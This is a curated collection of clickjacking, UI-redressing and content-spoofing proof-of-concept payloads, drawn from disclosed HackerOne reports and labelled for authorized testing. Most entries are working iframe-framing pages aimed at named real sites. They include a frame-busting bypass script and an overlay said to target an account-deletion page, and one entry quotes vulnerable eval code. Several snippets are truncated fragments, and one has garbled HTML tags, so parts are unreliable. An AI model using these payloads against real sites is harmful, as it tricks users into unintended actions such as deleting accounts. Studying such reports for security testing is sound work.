# Clickjacking, UI Redressing & Spoofing  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#658217](https://hackerone.com/reports/658217)  -  Clickjacking in [exchangemarketplace.com]
*low*

```
Vulnerable to Clickjacking
<script  >function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</script>
<div  qjid="quickjack" style="overflow: hidden; width: 1330px; height: 539px; position: relative;" id="cksl6">
<iframe   name="cksl7" src="https://exchangemarketplace.com" style="border: 0pt none ; left: -6px; top: -3px; position: absolute; width: 1366px; height: 576px;" scrolling="no" onload="window.cksl3='';window.cksl1=function(arg){if(!window.cksl2)window.cksl2=arg;if(window.cksl2<arg){if(window.cksl3){self.location.href=window.cksl3;}else {var c4=document.getElementById('cksl6').style;var c5=document.getElementsByName('cksl7')[0].style;document.body.style.overflow='hidden';document.body.style.width=document.body.style.height=c4.width=c5.width=c4.height=c5.height='100%';c4.position=c5.position='absolute';c4.overflow=c5.overflow='visible';c4.top=c5.top=c4.left=c5.left='0px';}window.cksl2=arg;}setTimeout('window.cksl1(history.length)',1000);};setTimeout('window.cksl1(history.length)',2000);"></iframe></div>
```

## 2. [#2964441](https://hackerone.com/reports/2964441)  -  Clickjacking in main domain https://topechelon.com/
*high*

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
# … truncated …
```

## 3. [#2964441](https://hackerone.com/reports/2964441)  -  Clickjacking in main domain https://topechelon.com/
*high*

```html
<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
```

## 4. [#1574017](https://hackerone.com/reports/1574017)  -  Clickjacking at  app.lemlist.com
*high*

```http
Put every above url one by one in the code of iframe, which is given below
```

## 5. [#997198](https://hackerone.com/reports/997198)  -  Content Spoofing/Text Injection in https://support.cs.money and JS file not minified and uglyfied which makes it clearly readable
*low*

```
case 'method':
            try {
                postMessage({
                    cbid: data.cbid,
                    result: eval(`(${data.method})`)()
                });
            } catch (err) {
                console.warn(err);
            }
            break;
```

## 6. [#658217](https://hackerone.com/reports/658217)  -  Clickjacking in [exchangemarketplace.com]
*low*

```html
<script  >function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</script>
```

## 7. [#997198](https://hackerone.com/reports/997198)  -  Content Spoofing/Text Injection in https://support.cs.money and JS file not minified and uglyfied which makes it clearly readable
*low*

```
${data.method}
```

## 8. [#643274](https://hackerone.com/reports/643274)  -  Viral Direct Message Clickjacking via link truncation leading to capture of both Google credentials & installation of malicious 3rd party Twitter App
*high*

```http
getmorefollowers.biz
```

## 9. [#1574017](https://hackerone.com/reports/1574017)  -  Clickjacking at  app.lemlist.com
*high*

```javascript
<html lang="tr-TR">
<kafa>
<meta karakter kümesi="UTF-8">
<title>Çerçeve Yapıyorum</title>
</head>
<body>
<h3>clickjacking güvenlik açığı</h3>
<iframe src="https://app.lemlist.com/teams/tea_sgYr5dZr478x4FQ9K/settings/user/usr_Z3GZ4DDHLLyLyZHj5/users" height="550px" width="700px"></iframe>
</body>
</html>
```

## 10. [#1294767](https://hackerone.com/reports/1294767)  -  clickjacking on deleting user's clips [https://crossclip.com/clips]
*low*

```
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I-Frame</title>
</head>
<body>
<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>

<iframe src="https://crossclip.com/clips" frameborder="0 px" height="1200px" width="1920px"></iframe>
</center>
</body>
</html>
```
